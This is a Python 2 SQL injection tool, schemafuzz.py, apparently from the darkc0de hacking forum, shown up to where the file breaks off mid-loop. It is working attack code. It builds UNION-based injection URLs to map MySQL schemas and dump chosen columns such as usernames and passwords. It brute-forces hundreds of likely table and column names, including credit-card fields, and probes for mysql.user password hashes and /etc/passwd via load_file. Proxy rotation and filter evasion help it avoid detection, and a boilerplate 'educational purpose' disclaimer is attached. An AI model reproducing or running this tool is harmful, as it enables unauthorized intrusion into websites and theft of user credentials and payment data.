#!/usr/bin/python
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
# MySQL Injection Schema, Dataext, and fuzzer

# Share the c0de!

# Darkc0de Team 
# www.darkc0de.com 
# rsauron[at]gmail[dot]com

# Greetz to 
# d3hydr8, Tarsian, c0mrade (r.i.p brotha), reverenddigitalx, 
# and the darkc0de crew

# NOTES: 
# Proxy function may be a little buggy if your using public proxies... Test your proxy prior to using it with this script..
# The script does do a little proxy test.. it does a GET to google.com if data comes back its good... no data = failed and the proxy 
# will not be used. This is a effort to keep the script from getting stuck in a endless loop.
# Any other questions Hit the forums and ask questions. google is your friend!

# This was written for educational purpose only. Use it at your own risk.
# Author will be not responsible for any damage!
# Intended for authorized Web Application Pen Testing!

# BE WARNED, THIS TOOL IS VERY LOUD..

#Set default evasion options here
arg_end = "--"
arg_eva = "+"

#colMax variable for column Finder
colMax = 205
#Fill in the tables you want tested here.
fuzz_tables = ['tbladmins', 'sort', '_wfspro_admin', '4images_users', 'a_admin', 'account', 'accounts', 'adm', 'admin', 'admin_login', 'admin_user', 'admin_userinfo', 'administer', 'administrable', 'administrate', 'administration', 'administrator', 'administrators', 'adminrights', 'admins', 'adminuser', 'art', 'article_admin', 'articles', 'artikel', '\xc3\x83\xc3\x9c\xc3\x82\xc3\xab', 'aut', 'author', 'autore', 'backend', 'backend_users', 'backenduser', 'bbs', 'book', 'chat_config', 'chat_messages', 'chat_users', 'client', 'clients', 'clubconfig', 'company', 'config', 'contact', 'contacts', 'content', 'control', 'cpg_config', 'cpg132_users', 'customer', 'customers', 'customers_basket', 'dbadmins', 'dealer', 'dealers', 'diary', 'download', 'Dragon_users', 'e107.e107_user', 'e107_user', 'forum.ibf_members', 'fusion_user_groups', 'fusion_users', 'group', 'groups', 'ibf_admin_sessions', 'ibf_conf_settings', 'ibf_members', 'ibf_members_converge', 'ibf_sessions', 'icq', 'images', 'index', 'info', 'ipb.ibf_members', 'ipb_sessions', 'joomla_users', 'jos_blastchatc_users', 'jos_comprofiler_members', 'jos_contact_details', 'jos_joomblog_users', 'jos_messages_cfg', 'jos_moschat_users', 'jos_users', 'knews_lostpass', 'korisnici', 'kpro_adminlogs', 'kpro_user', 'links', 'login', 'login_admin', 'login_admins', 'login_user', 'login_users', 'logins', 'logon', 'logs', 'lost_pass', 'lost_passwords', 'lostpass', 'lostpasswords', 'm_admin', 'main', 'mambo_session', 'mambo_users', 'manage', 'manager', 'mb_users', 'member', 'memberlist', 'members', 'minibbtable_users', 'mitglieder', 'movie', 'movies', 'mybb_users', 'mysql', 'mysql.user', 'name', 'names', 'news', 'news_lostpass', 'newsletter', 'nuke_authors', 'nuke_bbconfig', 'nuke_config', 'nuke_popsettings', 'nuke_users', '\xc3\x93\xc3\x83\xc2\xbb\xc2\xa7', 'obb_profiles', 'order', 'orders', 'parol', 'partner', 'partners', 'passes', 'password', 'passwords', 'perdorues', 'perdoruesit', 'phorum_session', 'phorum_user', 'phorum_users', 'phpads_clients', 'phpads_config', 'phpbb_users', 'phpBB2.forum_users', 'phpBB2.phpbb_users', 'phpmyadmin.pma_table_info', 'pma_table_info', 'poll_user', 'punbb_users', 'pwd', 'pwds', 'reg_user', 'reg_users', 'registered', 'reguser', 'regusers', 'session', 'sessions', 'settings', 'shop.cards', 'shop.orders', 'site_login', 'site_logins', 'sitelogin', 'sitelogins', 'sites', 'smallnuke_members', 'smf_members', 'SS_orders', 'statistics', 'superuser', 'sysadmin', 'sysadmins', 'system', 'sysuser', 'sysusers', 'table', 'tables', 'tb_admin', 'tb_administrator', 'tb_login', 'tb_member', 'tb_members', 'tb_user', 'tb_username', 'tb_usernames', 'tb_users', 'tbl', 'tbl_user', 'tbl_users', 'tbluser', 'tbl_clients', 'tbl_client', 'tblclients', 'tblclient', 'test', 'usebb_members', 'user', 'user_admin', 'user_info', 'user_list', 'user_login', 'user_logins', 'user_names', 'usercontrol', 'userinfo', 'userlist', 'userlogins', 'username', 'usernames', 'userrights', 'users', 'vb_user', 'vbulletin_session', 'vbulletin_user', 'voodoo_members', 'webadmin', 'webadmins', 'webmaster', 'webmasters', 'webuser', 'webusers', 'x_admin', 'xar_roles', 'xoops_bannerclient', 'xoops_users', 'yabb_settings', 'yabbse_settings', 'ACT_INFO', 'ActiveDataFeed', 'Category', 'CategoryGroup', 'ChicksPass', 'ClickTrack', 'Country', 'CountryCodes1', 'CustomNav', 'DataFeedPerformance1', 'DataFeedPerformance2', 'DataFeedPerformance2_incoming', 'DataFeedShowtag1', 'DataFeedShowtag2', 'DataFeedShowtag2_incoming', 'dtproperties', 'Event', 'Event_backup', 'Event_Category', 'EventRedirect', 'Events_new', 'Genre', 'JamPass', 'MyTicketek', 'MyTicketekArchive', 'News', 'Passwords by usage count', 'PerfPassword', 'PerfPasswordAllSelected', 'Promotion', 'ProxyDataFeedPerformance', 'ProxyDataFeedShowtag', 'ProxyPriceInfo', 'Region', 'SearchOptions', 'Series', 'Sheldonshows', 'StateList', 'States', 'SubCategory', 'Subjects', 'Survey', 'SurveyAnswer', 'SurveyAnswerOpen', 'SurveyQuestion', 'SurveyRespondent', 'sysconstraints', 'syssegments', 'tblRestrictedPasswords', 'tblRestrictedShows', 'Ticket System Acc Numbers', 'TimeDiff', 'Titles', 'ToPacmail1', 'ToPacmail2', 'Total Members', 'UserPreferences', 'uvw_Category', 'uvw_Pref', 'uvw_Preferences', 'Venue', 'venues', 'VenuesNew', 'X_3945', 'stone list', 'tblArtistCategory', 'tblArtists', 'tblConfigs', 'tblLayouts', 'tblLogBookAuthor', 'tblLogBookEntry', 'tblLogBookImages', 'tblLogBookImport', 'tblLogBookUser', 'tblMails', 'tblNewCategory', 'tblNews', 'tblOrders', 'tblStoneCategory', 'tblStones', 'tblUser', 'tblWishList', 'VIEW1', 'viewLogBookEntry', 'viewStoneArtist', 'vwListAllAvailable', 'CC_info', 'CC_username', 'cms_user', 'cms_users', 'cms_admin', 'cms_admins', 'user_name', 'jos_user', 'table_user', 'email', 'mail', 'bulletin', 'cc_info', 'login_name', 'admuserinfo', 'userlistuser_list', 'SiteLogin', 'Site_Login', 'UserAdmin', 'Admins', 'Login', 'Logins']
#Fill in the columns you want tested here.
fuzz_columns = ['user', 'username', 'password', 'passwd', 'pass', 'cc_number', 'id', 'email', 'emri', 'fjalekalimi', 'pwd', 'user_name', 'customers_email_address', 'customers_password', 'user_password', 'name', 'user_pass', 'admin_user', 'admin_password', 'admin_pass', 'usern', 'user_n', 'users', 'login', 'logins', 'login_user', 'login_admin', 'login_username', 'user_username', 'user_login', 'auid', 'apwd', 'adminid', 'admin_id', 'adminuser', 'adminuserid', 'admin_userid', 'adminusername', 'admin_username', 'adminname', 'admin_name', 'usr', 'usr_n', 'usrname', 'usr_name', 'usrpass', 'usr_pass', 'usrnam', 'nc', 'uid', 'userid', 'user_id', 'myusername', 'mail', 'emni', 'logohu', 'punonjes', 'kpro_user', 'wp_users', 'emniplote', 'perdoruesi', 'perdorimi', 'punetoret', 'logini', 'llogaria', 'fjalekalimin', 'kodi', 'emer', 'ime', 'korisnik', 'korisnici', 'user1', 'administrator', 'administrator_name', 'mem_login', 'login_password', 'login_pass', 'login_passwd', 'login_pwd', 'sifra', 'lozinka', 'psw', 'pass1word', 'pass_word', 'passw', 'pass_w', 'user_passwd', 'userpass', 'userpassword', 'userpwd', 'user_pwd', 'useradmin', 'user_admin', 'mypassword', 'passwrd', 'admin_pwd', 'admin_passwd', 'mem_password', 'memlogin', 'e_mail', 'usrn', 'u_name', 'uname', 'mempassword', 'mem_pass', 'mem_passwd', 'mem_pwd', 'p_word', 'pword', 'p_assword', 'myname', 'my_username', 'my_name', 'my_password', 'my_email', 'cvvnumber ', 'about', 'access', 'accnt', 'accnts', 'account', 'accounts', 'admin', 'adminemail', 'adminlogin', 'adminmail', 'admins', 'aid', 'aim', 'auth', 'authenticate', 'authentication', 'blog', 'cc_expires', 'cc_owner', 'cc_type', 'cfg', 'cid', 'clientname', 'clientpassword', 'clientusername', 'conf', 'config', 'contact', 'converge_pass_hash', 'converge_pass_salt', 'crack', 'customer', 'customers', 'cvvnumber]', 'data', 'db_database_name', 'db_hostname', 'db_password', 'db_username', 'download', 'e-mail', 'emailaddress', 'full', 'gid', 'group', 'group_name', 'hash', 'hashsalt', 'homepage', 'icq', 'icq_number', 'id_group', 'id_member', 'images', 'index', 'ip_address', 'last_ip', 'last_login', 'lastname', 'log', 'login_name', 'login_pw', 'loginkey', 'loginout', 'logo', 'md5hash', 'member', 'member_id', 'member_login_key', 'member_name', 'memberid', 'membername', 'members', 'new', 'news', 'nick', 'number', 'nummer', 'pass_hash', 'passwordsalt', 'passwort', 'personal_key', 'phone', 'privacy', 'pw', 'pwrd', 'salt', 'search', 'secretanswer', 'secretquestion', 'serial', 'session_member_id', 'session_member_login_key', 'sesskey', 'setting', 'sid', 'spacer', 'status', 'store', 'store1', 'store2', 'store3', 'store4', 'table_prefix', 'temp_pass', 'temp_password', 'temppass', 'temppasword', 'text', 'un', 'user_email', 'user_icq', 'user_ip', 'user_level', 'user_passw', 'user_pw', 'user_pword', 'user_pwrd', 'user_un', 'user_uname', 'user_usernm', 'user_usernun', 'user_usrnm', 'userip', 'userlogin', 'usernm', 'userpw', 'usr2', 'usrnm', 'usrs', 'warez', 'xar_name', 'xar_pass']

import urllib, sys, re, os, socket, httplib, urllib2, time, random

#determine platform
if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'

#say hello
os.system(SysCls)
if len(sys.argv) <= 1:
        print "\n|---------------------------------------------------------------|"
        print "| rsauron[@]gmail[dot]com                                v5.0   |"
        print "|   6/2008      schemafuzz.py                                   |"
        print "|      -MySQL v5+ Information_schema Database Enumeration       |"
        print "|      -MySQL v4+ Data Extractor                                |"
        print "|      -MySQL v4+ Table & Column Fuzzer                         |"
        print "| Usage: schemafuzz.py [options]                                |"
        print "|                      -h help                    darkc0de.com  |"
        print "|---------------------------------------------------------------|\n"
        sys.exit(1)
			

#help option
for arg in sys.argv:
        if arg == "-h":
                print "   Usage: ./schemafuzz.py [options]                          rsauron[@]gmail[dot]com darkc0de.com"
                print "\tModes:"
                print "\tDefine: --dbs     Shows all databases user has access too.               MySQL v5+"
                print "\tDefine: --schema  Enumerate Information_schema Database.                 MySQL v5+"
                print "\tDefine: --full    Enumerates all databases information_schema table      MySQL v5+"
                print "\tDefine: --dump    Extract information from a Database, Table and Column. MySQL v4+"
                print "\tDefine: --fuzz    Fuzz Tables and Columns.                               MySQL v4+"
                print "\tDefine: --findcol Finds Columns length of a SQLi                         MySQL v4+"
                print "\tDefine: --info    Gets MySQL server configuration only.                  MySQL v4+"
                print "\n\tRequired:"
                print "\tDefine: -u        URL \"www.site.com/news.php?id=-1+union+select+1,darkc0de,3,4\""
                print "\n\tMode dump and schema options:"
                print "\tDefine: -D        \"database_name\""
                print "\tDefine: -T        \"table_name\""
                print "\tDefine: -C        \"column_name,column_name...\""
                print "\n\tOptional:"
                print "\tDefine: -p        \"127.0.0.1:80 or proxy.txt\""
                print "\tDefine: -o        \"ouput_file_name.txt\"        Default is schemafuzzlog.txt"
                print "\tDefine: -r        row number to start at"
                print "\tDefine: -v        Verbosity off option. Will not display row #'s in dump mode."   
                print "\n   Ex: ./schemafuzz.py --info -u \"www.site.com/news.php?id=-1+union+select+1,darkc0de,3,4\""
                print "   Ex: ./schemafuzz.py --dbs -u \"www.site.com/news.php?id=-1+union+select+1,darkc0de,3,4\""
                print "   Ex: ./schemafuzz.py --schema -u \"www.site.com/news.php?id=-1+union+select+1,darkc0de,3,4\" -D catalog -T orders -r 200"
                print "   Ex: ./schemafuzz.py --dump -u \"www.site.com/news.php?id=-1+union+select+1,darkc0de,3,4\" -D joomla -T jos_users -C username,password"
                print "   Ex: ./schemafuzz.py --fuzz -u \"www.site.com/news.php?id=-1+union+select+1,darkc0de,3,4\" -end \"/*\" -o sitelog.txt"
                print "   Ex: ./schemafuzz.py --findcol -u \"www.site.com/news.php?id=22\""
                sys.exit(1) 

#define varablies
site = ""
dbt = "schemafuzzlog.txt"
proxy = "None"
count = 0
arg_table = "None"
arg_database = "None"
arg_columns = "None"
arg_row = "Rows"
arg_verbose = 1
darkc0de = "concat(0x1e,0x1e,"
mode = "None"
line_URL = ""
count_URL = ""
gets = 0
cur_db = ""
cur_table = ""
table_num = 0
terminal = ""
num = 0


#Check args
for arg in sys.argv:
	if arg == "-u":
		site = sys.argv[count+1]
	elif arg == "-o":
		dbt = sys.argv[count+1]
	elif arg == "-p":
		proxy = sys.argv[count+1]
	elif arg == "--dump":
                mode = arg
                arg_dump = sys.argv[count]
        elif arg == "--full":
                mode = arg
        elif arg == "--schema":
                mode = arg
                arg_schema = sys.argv[count]
        elif arg == "--dbs":
                mode = arg
                arg_dbs = sys.argv[count]
        elif arg == "--fuzz":
                mode = arg
                arg_fuzz = sys.argv[count]
        elif arg == "--info":
                mode = arg
                arg_info = sys.argv[count]
        elif arg == "--findcol":
                mode = arg
                arg_findcol = sys.argv[count]
	elif arg == "-D":
		arg_database = sys.argv[count+1]
	elif arg == "-T":
		arg_table = sys.argv[count+1]
	elif arg == "-C":
		arg_columns = sys.argv[count+1]
	elif arg == "-end":
                arg_end = sys.argv[count+1]
                if arg_end == "--":
                        arg_eva = "+"
                else:
                        arg_eva = "/**/"
	elif arg == "-r":
                num = sys.argv[count+1]
                table_num = num
        elif arg == "-v":
                arg_verbose = sys.argv[count]
                arg_verbose = 0
	count+=1

#Title write
file = open(dbt, "a")
print "\n|---------------------------------------------------------------|"
print "| rsauron[@]gmail[dot]com                                v5.0   |"
print "|   6/2008      schemafuzz.py                                   |"
print "|      -MySQL v5+ Information_schema Database Enumeration       |"
print "|      -MySQL v4+ Data Extractor                                |"
print "|      -MySQL v4+ Table & Column Fuzzer                         |"
print "| Usage: schemafuzz.py [options]                                |"
print "|                      -h help                    darkc0de.com  |"
print "|---------------------------------------------------------------|"
file.write("\n|---------------------------------------------------------------|")
file.write("\n| rsauron[@]gmail[dot]com                                v5.0   |")
file.write("\n|   6/2008      schemafuzz.py                                   |")
file.write("\n|      -MySQL v5+ Information_schema Database Enumeration       |")
file.write("\n|      -MySQL v4+ Data Extractor                                |")
file.write("\n|      -MySQL v4+ Table & Column Fuzzer                         |")
file.write("\n| Usage: schemafuzz.py [options]                                |")
file.write("\n|                      -h help                    darkc0de.com  |")
file.write("\n|---------------------------------------------------------------|")

#Arg Error Checking
if site == "":
        print "\n[-] Must include -u flag and specify a mode."
        print "[-] For help -h\n"
        sys.exit(1)
if mode == "None":
        print "\n[-] Mode must be specified --schema, --dbs, --dump, --fuzz, --info, --full, --findcol."
        print "[-] For help -h\n"
        sys.exit(1)
if mode == "--schema" and arg_database == "None":
        print "[-] Must include -D flag!"
        print "[-] For Help -h\n"
        sys.exit(1)
if mode == "--dump":
        if arg_table == "None" or arg_columns == "None":
                print "[-] If MySQL v5+ must include -D, -T and -C flag when --dump specified!"
                print "[-] If MySQL v4+ must include -T and -C flag when --dump specified!"
                print "[-] For help -h\n"
                sys.exit(1)
if mode != "--findcol" and site.find("darkc0de") == -1: 
	print "\n[-] Site must contain \'darkc0de\'\n" 
	sys.exit(1)
if proxy != "None":
        if len(proxy.split(".")) == 2:
                proxy = open(proxy, "r").read()
        if proxy.endswith("\n"):
                proxy = proxy.rstrip("\n")
        proxy = proxy.split("\n")
if arg_columns != "None":
        arg_columns = arg_columns.split(",")
if site[:7] != "http://": 
	site = "http://"+site
if site.endswith("/*"):
	site = site.rstrip('/*')
if site.endswith("--"):
	site = site.rstrip('--')
	
#Getting the URL ready with the evasion options we selected
site = site.replace("+",arg_eva)
site = site.replace("/**/",arg_eva)
print "\n[+] URL:",site+arg_end
file.write("\n\n[+] URL:"+site+arg_end+"\n")
print "[+] Evasion Used:","\""+arg_eva+"\" \""+arg_end+"\""
file.write("[+] Evasion Used: \""+str(arg_eva)+"\" \""+str(arg_end)+"\"")
print "[+] %s" % time.strftime("%X")
file.write("\n[+] %s" % time.strftime("%X"))

#Build proxy list
socket.setdefaulttimeout(20)
proxy_list = []
if proxy != "None":
	file.write("\n[+] Building Proxy List...")
	print "[+] Building Proxy List..."
	for p in proxy:
		try:
			proxy_handler = urllib2.ProxyHandler({'http': 'http://'+p+'/'})
			opener = urllib2.build_opener(proxy_handler)
			gets+=1
			opener.open("http://www.google.com")
			proxy_list.append(urllib2.build_opener(proxy_handler))
			file.write("\n\tProxy:"+p+"- Success")
			print "\tProxy:",p,"- Success"
		except:
			file.write("\n\tProxy:"+p+"- Failed")
			print "\tProxy:",p,"- Failed"
			pass
	if len(proxy_list) == 0:
		print "[-] All proxies have failed. App Exiting"
		sys.exit(1) 
	print "[+] Proxy List Complete"
	file.write("\n[+] Proxy List Complete")
else:
	print "[-] Proxy Not Given"
	file.write("\n[+] Proxy Not Given")
	proxy_list.append(urllib2.build_opener())
proxy_num = 0
proxy_len = len(proxy_list)

#colFinder
if mode == "--findcol":
        print "[+] Attempting To find the number of columns..."
        file.write("\n[+] Attempting To find the number of columns...")
        print "[+] Testing: ",
        file.write("\n[+] Testing: ",)
        checkfor=[]
        sitenew = site+arg_eva+"AND"+arg_eva+"1=2"+arg_eva+"UNION"+arg_eva+"SELECT"+arg_eva
        makepretty = ""
        for x in xrange(0,colMax):
                try:
                        sys.stdout.write("%s," % (x))
                        file.write(str(x)+",")
                        sys.stdout.flush()
                        darkc0de = "dark"+str(x)+"c0de"
                        checkfor.append(darkc0de)  
                        if x > 0: 
                                sitenew += ","
                        sitenew += "0x"+darkc0de.encode("hex")	
                        finalurl = sitenew+arg_end
                        gets+=1
                        proxy_num+=1
                        source = proxy_list[proxy_num % proxy_len].open(finalurl).read()
                        for y in checkfor:
                                colFound = re.findall(y,source)
                                if len(colFound) >= 1:
                                        print "\n[+] Column Length is:",len(checkfor)
                                        file.write("\n[+] Column Length is: "+str(len(checkfor)))
                                        nullcol = re.findall(("\d+"),y)
                                        print "[+] Found null column at column #:",nullcol[0]
                                        file.write("\n[+] Found null column at column #: "+nullcol[0])
                                        for z in xrange(0,len(checkfor)):
                                                if z > 0:
                                                        makepretty += ","
                                                makepretty += str(z)
                                        site = site+arg_eva+"AND"+arg_eva+"1=2"+arg_eva+"UNION"+arg_eva+"SELECT"+arg_eva+makepretty
                                        print "[+] SQLi URL:",site+arg_end
                                        file.write("\n[+] SQLi URL: "+site+arg_end)
                                        site = site.replace(","+nullcol[0]+",",",darkc0de,")
                                        site = site.replace(arg_eva+nullcol[0]+",",arg_eva+"darkc0de,")
                                        site = site.replace(","+nullcol[0],",darkc0de")
                                        print "[+] darkc0de URL:",site
                                        file.write("\n[+] darkc0de URL: "+site)
                                        print "[-] Done!\n"
                                        file.write("\n[-] Done!\n")
                                        sys.exit(1)
                except (KeyboardInterrupt, SystemExit):
                        raise
                except:
                        pass
                        
        print "\n[!] Sorry Column Length could not be found."
        file.write("\n[!] Sorry Column Length could not be found.")
        print "[-] You might try to change colMax variable or change evasion option.. last but not least do it manually!"
        print "[-] Done\n"
        sys.exit(1)

#Retireve version:user:database
head_URL = site.replace("darkc0de","concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)")+arg_end
print "[+] Gathering MySQL Server Configuration..."
file.write("\n[+] Gathering MySQL Server Configuration...\n")

while 1:
	try:
                gets+=1
		source = proxy_list[proxy_num % proxy_len].open(head_URL).read()
# Uncomment the following lines to debug issues with gathering server information
#		print head_URL
#		print source
		match = re.findall("\x1e\x1e\S+",source)
		if len(match) >= 1:
			match = match[0][2:].split("\x1e")
			version = match[0]
			user = match[1]
			database = match[2]
			print "\tDatabase:", database
			print "\tUser:", user
			print "\tVersion:", version
			file.write("\tDatabase: "+database+"\n")	
			file.write("\tUser: "+user+"\n")
			file.write("\tVersion: "+version)
                        version = version[0]
                        break
		else:
			print "[-] No Data Found"
			sys.exit(1)
	except (KeyboardInterrupt, SystemExit):
        	raise
	except:
		proxy_num+=1

# Do we have Access to MySQL database and Load_File
if mode == "--info":
        head_URL = site.replace("darkc0de","0x"+"darkc0de".encode("hex"))+arg_eva+"FROM"+arg_eva+"mysql.user"+arg_end
        gets+=1
        proxy_num+=1
        #print "Debug:",head_URL 
        source = proxy_list[proxy_num % proxy_len].open(head_URL).read()
        match = re.findall("darkc0de",source)
        if len(match) >= 1:
                yesno = "Yes <-- w00t w00t"
        else:
                yesno = "No"
        print "\n[+] Do we have Access to MySQL Database:",yesno
        file.write("\n\n[+] Do we have Access to MySQL Database: "+str(yesno))
        if yesno == "Yes <-- w00t w00t":
                print "[!]",site.replace("darkc0de","concat(user,0x3a,password)")+arg_eva+"FROM"+arg_eva+"mysql.user"+arg_end
                file.write("\n[!] "+site.replace("darkc0de","concat(user,0x3a,password)")+arg_eva+"FROM"+arg_eva+"mysql.user"+arg_end)
        gets+=1
        proxy_num+=1
        head_URL = site.replace("darkc0de","load_file(0x2f6574632f706173737764)")+arg_end
        #print "Debug:",head_URL
        source = proxy_list[proxy_num % proxy_len].open(head_URL).read()
        match = re.findall("root:x:",source)
        match = re.findall("root:*:",source)
        if len(match) >= 1:
                yesno = "Yes <-- w00t w00t"
        else:
                yesno = "No"
        print "\n[+] Do we have Access to Load_File:",yesno
        file.write("\n\n[+] Do we have Access to Load_File: "+str(yesno))
        if yesno == "Yes <-- w00t w00t":
                print "[!]",site.replace("darkc0de","load_file(0x2f6574632f706173737764)")+arg_end
                file.write("\n[!] "+site.replace("darkc0de","load_file(0x2f6574632f706173737764)")+arg_end)

#lets check what we can do based on version
if mode == "--schema" or mode == "--dbs" or mode == "--full":
        if int(version) == 4:
                print "\n[-] --schema, --dbs and --full can only be used on MySQL v5+ servers!"
                print "[-] -h for help"
                sys.exit(1)
#Build URLS
if mode == "--schema":
	if arg_database != "None" and arg_table == "None":
                print "[+] Showing Tables & Columns from database \""+arg_database+"\""
                file.write("\n[+] Showing Tables & Columns from database \""+arg_database+"\"")
        	line_URL = site.replace("darkc0de","concat(0x1e,0x1e,table_schema,0x1e,table_name,0x1e,column_name,0x1e,0x20)")
                line_URL += arg_eva+"FROM"+arg_eva+"information_schema.columns"+arg_eva+"WHERE"+arg_eva+"table_schema=0x"+arg_database.encode("hex")
                count_URL = site.replace("darkc0de","concat(0x1e,0x1e,COUNT(table_schema),0x1e,0x20)")
                count_URL += arg_eva+"FROM"+arg_eva+"information_schema.tables"+arg_eva+"WHERE"+arg_eva+"table_schema=0x"+arg_database.encode("hex")+arg_end
                arg_row = "Tables"
        if arg_database != "None" and arg_table != "None":
                print "[+] Showing Columns from Database \""+arg_database+"\" and Table \""+arg_table+"\""
                file.write("\n[+] Showing Columns from database \""+arg_database+"\" and Table \""+arg_table+"\"")
        	line_URL = site.replace("darkc0de","concat(0x1e,0x1e,table_schema,0x1e,table_name,0x1e,column_name,0x1e,0x20)")
                line_URL += arg_eva+"FROM"+arg_eva+"information_schema.COLUMNS"+arg_eva+"WHERE"+arg_eva+"table_schema=0x"+arg_database.encode("hex")
		line_URL += arg_eva+"AND"+arg_eva+"table_name+=+0x"+arg_table.encode("hex")
                count_URL = site.replace("darkc0de","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")
                count_URL += arg_eva+"FROM"+arg_eva+"information_schema.COLUMNS"+arg_eva+"WHERE"+arg_eva+"table_schema=0x"+arg_database.encode("hex")
		count_URL += arg_eva+"AND"+arg_eva+"table_name+=+0x"+arg_table.encode("hex")+arg_end
		arg_row = "Columns"
elif mode == "--dump":                
	print "[+] Dumping data from database \""+str(arg_database)+"\" Table \""+str(arg_table)+"\""
	print "[+] and Column(s) "+str(arg_columns)
	file.write("\n[+] Dumping data from database \""+str(arg_database)+"\" Table \""+str(arg_table)+"\"")
        file.write("\n[+] Column(s) "+str(arg_columns))
        for column in arg_columns:
                darkc0de += column+",0x1e,"
	count_URL = site.replace("darkc0de","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")
	count_URL += arg_eva+"FROM"+arg_eva+arg_database+"."+arg_table+arg_end
	line_URL = site.replace("darkc0de",darkc0de+"0x1e,0x20)")
	line_URL += arg_eva+"FROM"+arg_eva+arg_database+"."+arg_table
        if int(version) == 4:
                count_URL = site.replace("darkc0de","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")
                count_URL += arg_eva+"FROM"+arg_eva+arg_table+arg_end
        	line_URL = site.replace("darkc0de",darkc0de+"0x1e,0x20)")
                line_URL += arg_eva+"FROM"+arg_eva+arg_table
elif mode == "--full":
	print "[+] Starting full SQLi information_schema enumeration..."
	line_URL = site.replace("darkc0de","concat(0x1e,0x1e,table_schema,0x1e,table_name,0x1e,column_name,0x1e,0x20)")
	line_URL += arg_eva+"FROM"+arg_eva+"information_schema.columns+"+arg_eva+"WHERE"+arg_eva+"table_schema!=0x"+"information_schema".encode("hex")
		
elif mode == "--dbs":
	print "[+] Showing all databases current user has access too!"
	file.write("\n[+] Showing all databases current user has access too!")
        count_URL = site.replace("darkc0de","concat(0x1e,0x1e,COUNT(*),0x1e,0x20)")
        count_URL += arg_eva+"FROM"+arg_eva+"information_schema.schemata"+arg_eva+"WHERE"+arg_eva+"schema_name!=0x"+"information_schema".encode("hex")+arg_end
	line_URL = site.replace("darkc0de","concat(0x1e,0x1e,schema_name,0x1e,0x20)")
	line_URL += arg_eva+"FROM"+arg_eva+"information_schema.schemata"+arg_eva+"WHERE"+arg_eva+"schema_name!=0x"+"information_schema".encode("hex")
	arg_row = "Databases"
line_URL += arg_eva+"LIMIT"+arg_eva+"NUM,1"+arg_end

#Uncomment the lines below to debug issues with the line_URL or count_URL
#print "URL for Counting rows in column:",count_URL
#print "URL for exploit:",line_URL

#Fuzz table/columns
if mode == "--fuzz":
        print "[+] Number of tables names to be fuzzed:",len(fuzz_tables)
        file.write("\n[+] Number of tables names to be fuzzed: "+str(len(fuzz_tables)))
        print "[+] Number of column names to be fuzzed:",len(fuzz_columns)
        file.write("\n[+] Number of column names to be fuzzed: "+str(len(fuzz_columns)))
        print "[+] Searching for tables and columns..."
        file.write("\n[+] Searching for tables and columns...")
        fuzz_URL = site.replace("darkc0de","0x"+"darkc0de".encode("hex"))+arg_eva+"FROM"+arg_eva+"TABLE"+arg_end
        for table in fuzz_tables: 
                try:
                        proxy_num+=1
                        table_URL = fuzz_URL.replace("TABLE",table)
                        gets+=1
                        #print "[!] Table Debug:",table_URL
                        source = proxy_list[proxy_num % proxy_len].open(table_URL).read()
                        e = re.findall("darkc0de", source)
                        if len(e) > 0:
                                print "\n[!] Found a table called:",table
                                file.write("\n\n[+] Found a table called: "+str(table))
                                print "\n[+] Now searching for columns inside table \""+table+"\""
                                file.write("\n\n[+] Now searching for columns inside table \""+str(table)+"\"")
                                for column in fuzz_columns:
                                        try:
                                                proxy_num+=1
                                                gets+=1
                                                #print "[!] Column Debug:",table_URL.replace("0x6461726b63306465", "concat(0x6461726b63306465,0x3a,"+column+")")
                                                source = proxy_list[proxy_num % proxy_len].open(table_URL.replace("0x6461726b63306465", "concat(0x6461726b63306465,0x3a,"+column+")")).read()
                                                e = re.findall("darkc0de",source)
                                                if len(e) > 0:
                                                        print "[!] Found a column called:",column
                                                        file.write("\n[!] Found a column called:"+column)	
                                        except (KeyboardInterrupt, SystemExit):
                                                raise
                                        except:
                                                pass
                                print "[-] Done searching inside table \""+table+"\" for columns!"
                                file.write("\n[-] Done searching inside table \""+str(table)+"\" for columns!")
                except (KeyboardInterrupt, SystemExit):
                        raise
                except:
                        pass
        
#Lets Count how many rows or columns
if mode == "--schema" or mode == "--dump" or mode == "--dbs":
        source = proxy_list[proxy_num % proxy_len].open(count_URL).read() 
        match = re.findall("\x1e\x1e\S+",source)
        match = match[0][2:].split("\x1e")
        row_value = match[0]
        print "[+] Number of "+arg_row+": "+row_value
        file.write("\n[+] Number of "+arg_row+": "+str(row_value)+"\n")
if mode == "--schema" or mode == "--full" or mode == "--dbs":
        print
##Schema Enumeration and DataExt loop
if mode == "--schema" or mode == "--dump" or mode == "--dbs":
	while int(table_num) != int(row_value)+1:
                #print "table#:",table_num,"row#:",row_value
		try:
			proxy_num+=1
			gets+=1
			#print line_URL
			source = proxy_list[proxy_num % proxy_len].open(line_URL.replace("NUM",str(num))).read() 
			match = re.findall("\x1e\x1e\S+",source)
			if len(match) >= 1:
				if mode == "--schema" or mode == "--full":
					match = match[0][2:].split("\x1e")
					if cur_db != match[0]:			
						cur_db = match[0]
						file.write("\n[Database]: "+match[0]+"\n")
						print "[Database]: "+match[0]
						print "[Table: Columns]"
						file.write("[Table: Columns]")
					if cur_table != match[1]:
                                                print "\n["+str(table_num)+"]"+match[1]+": "+match[2],
                                                file.write("\n["+str(table_num)+"]"+match[1]+": "+match[2])
						cur_table = match[1]
                                		table_num = int(table_num) + 1
					else:
                                                sys.stdout.write(",%s" % (match[2]))
                                                file.write(","+match[2])
                                                sys.stdout.flush()
				#Gathering Databases only
                   		elif mode == "--dbs":
                        		match = match[0]
